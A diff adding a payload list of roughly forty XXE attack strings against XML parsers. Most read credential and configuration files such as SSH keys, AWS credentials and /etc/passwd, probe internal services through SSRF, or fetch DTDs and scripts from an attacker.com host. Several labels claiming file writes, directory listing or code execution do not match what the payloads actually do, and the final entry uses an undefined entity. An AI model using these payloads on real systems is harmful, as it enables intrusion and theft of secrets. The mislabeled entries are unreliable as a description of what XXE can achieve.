@@ -1,0 +1,122 @@
+<!-- Basic XXE Payload (Read file) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access the Windows Hosts File -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Trigger SSRF (Access localhost) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secret"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access WordPress Configuration -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Entity Expansion (Billion Laughs Attack) -->
+<!DOCTYPE foo [ <!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ]> <foo>&b;</foo>
+
+<!-- XXE with HTTP Request to External Server (External DTD) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Directory Traversal to Access Sensitive Files -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///../../../../etc/passwd"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with HTTP Request to Attacker’s Server (with Port Enumeration) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com:8080/index.html"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Recursive Entity Expansion (Memory Exhaustion) -->
+<!DOCTYPE foo [ <!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ]> <foo>&b;</foo>
+
+<!-- XXE with XML Entity Expansion to Leak Environment Variables -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Local File Inclusion (Access PHP Files) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access MySQL Configuration -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with HTTP Request to External File -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/malicious-payload.xml"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for SSRF to Internal API (Private/Internal Network) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/internal-api"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access SSH Keys (Private Key File) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Remote Code Execution (Inject External Script) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/payload.sh"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access Sensitive Configuration Files -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/httpd/conf/httpd.conf"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for External Entity Injection to Trigger Remote File Include -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/rfi-payload.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with HTTP Request to Local Web Application for SSRF -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:5000/api"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for DoS (Excessive Entity Expansion) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Accessing Internal Application Logs -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/app.log"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Read PHP Configuration -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/php.ini"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access System Environment Variables -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for HTTP Request to Web Shell -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/shell.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Accessing Apache Access Logs -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with URL Inclusion from External Server -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/malicious-file.xml"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for SSRF to Access Database Admin Panel -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/db-admin"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Stealthy External Request (to Hide Attack) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/hidden-payload"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Access Cloud Service Credentials -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.aws/credentials"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for File Write (Creating a Malicious File) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///tmp/evil-file.txt"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to List Files in a Directory -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///bin/ls"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Triggering RCE via a Malicious Payload -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/rce-payload"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Exploiting Vulnerable Web Application -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/exploit"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Entity Expansion for Infinite Loop (Denial of Service) -->
+<!DOCTYPE foo [ <!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"> ]> <foo>&b;</foo>
+
+<!-- XXE to Access Configuration Files on a Web Server -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Server-Side Request Forgery (SSRF) to External Resource -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/resource"> ]> <foo>&xxe;</foo>
+
+<!-- XXE with Exploitation of Internal Services (localhost) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:3306"> ]> <foo>&xxe;</foo>
+
+<!-- XXE for Exploiting Internal DNS Resolution (SSRF) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:53"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Trigger Remote File Fetch via URL (To Execute Code) -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/malicious.php"> ]> <foo>&xxe;</foo>
+
+<!-- XXE to Include External DTD from Attacker's Server -->
+<!DOCTYPE foo SYSTEM "http://attacker.com/external.dtd"> <foo>&xxe;</foo>
+
+<!-- XXE for Remote Code Execution via External URL -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/shell-script"> ]> <foo>&xxe;</foo>
